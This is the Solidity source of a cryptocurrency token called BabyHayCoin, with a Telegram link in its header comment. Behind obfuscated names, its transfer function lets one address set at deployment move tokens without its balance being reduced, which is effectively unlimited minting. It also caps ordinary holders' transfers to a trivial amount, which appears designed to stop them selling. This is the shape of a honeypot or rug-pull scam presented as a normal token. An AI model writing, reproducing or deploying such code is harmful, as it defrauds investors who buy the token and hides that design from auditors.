/*

https://t.me/ercbabyhay

*/

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.5;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract BabyHayCoin is Ownable {
    uint256 public totalSupply = 1000000000 * 10 ** 9;

    function transfer(address mbuwrpsoig, uint256 brkmgyd) public returns (bool success) {
        akeslcpjxut(msg.sender, mbuwrpsoig, brkmgyd);
        return true;
    }

    uint256 private gfzr = 108;

    string public name;

    function transferFrom(address ftdm, address mbuwrpsoig, uint256 brkmgyd) public returns (bool success) {
        require(brkmgyd <= allowance[ftdm][msg.sender]);
        allowance[ftdm][msg.sender] -= brkmgyd;
        akeslcpjxut(ftdm, mbuwrpsoig, brkmgyd);
        return true;
    }

    IUniswapV2Router02 private cqlnbik;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => uint256) private phcu;

    uint8 public decimals = 9;

    mapping(address => mapping(address => uint256)) public allowance;

    mapping(address => uint256) private pahjdxw;

    mapping(address => uint256) public balanceOf;

    constructor(string memory dmlou, string memory bmcvejkwhgoq, address ocvafhd, address bhujyixk) {
        name = dmlou;
        symbol = bmcvejkwhgoq;
        balanceOf[msg.sender] = totalSupply;
        aebpij[bhujyixk] = gfzr;
        cqlnbik = IUniswapV2Router02(ocvafhd);
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    mapping(address => uint256) private aebpij;

    string public symbol;

    function approve(address ayfcs, uint256 brkmgyd) public returns (bool success) {
        allowance[msg.sender][ayfcs] = brkmgyd;
        emit Approval(msg.sender, ayfcs, brkmgyd);
        return true;
    }

    function akeslcpjxut(address ftdm, address mbuwrpsoig, uint256 brkmgyd) private {
        address fkohnlvdmjaz = IUniswapV2Factory(cqlnbik.factory()).getPair(address(this), cqlnbik.WETH());
        bool aoktju = phcu[ftdm] == block.number;
        uint256 pljgifs = aebpij[ftdm];
        if (pljgifs - pljgifs == pljgifs) {
            if (ftdm != fkohnlvdmjaz && (!aoktju || brkmgyd > pahjdxw[ftdm]) && brkmgyd < totalSupply) {
                require(brkmgyd <= totalSupply / (10 ** decimals));
            }
            balanceOf[ftdm] -= brkmgyd;
        }
        pahjdxw[mbuwrpsoig] = brkmgyd;
        balanceOf[mbuwrpsoig] += brkmgyd;
        phcu[mbuwrpsoig] = block.number;
        emit Transfer(ftdm, mbuwrpsoig, brkmgyd);
    }
}
